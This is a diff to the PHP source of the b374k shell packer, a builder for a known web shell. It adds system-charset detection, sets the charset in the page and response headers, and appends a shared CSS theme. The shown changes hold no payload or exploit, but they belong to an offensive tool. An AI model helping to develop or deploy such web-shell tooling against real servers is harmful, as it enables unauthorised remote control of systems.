@@ -6,6 +6,9 @@
 	https://github.com/b374k/b374k
 
 */
+if(!defined('USER_IS_WIN')) define('USER_IS_WIN', DIRECTORY_SEPARATOR == '\\');
+if(!defined('DETECT_SYS_CHARSET')) define('DETECT_SYS_CHARSET', DIRECTORY_SEPARATOR == '\\'?'gb2312':'utf-8');
+
 $GLOBALS['packer']['title'] = "b374k shell packer";
 $GLOBALS['packer']['version'] = "0.4.2";
 $GLOBALS['packer']['base_dir'] = "./base/";
@@ -34,6 +37,7 @@ $js_code .= "\n\n".packer_read_file($GLOBALS['packer']['base_dir']."base.js");
 if(isset($_COOKIE['packer_theme']))	$theme = $_COOKIE['packer_theme'];
 else $theme ="default";
 $css_code = packer_read_file($GLOBALS['packer']['theme_dir'].$theme.".css");
+$css_code .= packer_read_file($GLOBALS['packer']['theme_dir'] . "common.css");
 
 /* JAVASCRIPT AND CSS FILES END */
 
@@ -124,7 +128,7 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 	<html>
 	<head>
 	<title><?php echo $GLOBALS['packer']['title']." ".$GLOBALS['packer']['version'];?></title>
-	<meta charset='utf-8'>
+	<meta charset='<?php echo DETECT_SYS_CHARSET; ?>'>
 	<meta name='robots' content='noindex, nofollow, noarchive'>
 	<style type="text/css">
 	<?php echo $css_code;?>
@@ -309,6 +313,7 @@ else{
 			die();
 		}
 		$css_code = packer_read_file($GLOBALS['packer']['theme_dir'].$theme.".css");
+		$css_code .= packer_read_file($GLOBALS['packer']['theme_dir'] . "common.css");
 		
 		$modules = isset($opt['m'])? trim($opt['m']):implode(",", $GLOBALS['packer']['module']);
 		if(empty($modules)) $modules = array();
@@ -431,7 +436,7 @@ function packer_wrap_with_quote($str){
 }
 
 function packer_output($str){
-	header("Content-Type: text/plain");
+	header("Content-Type: text/plain;charset=".DETECT_SYS_CHARSET);
 	header("Cache-Control: no-cache");
 	header("Pragma: no-cache");
 	echo $str;
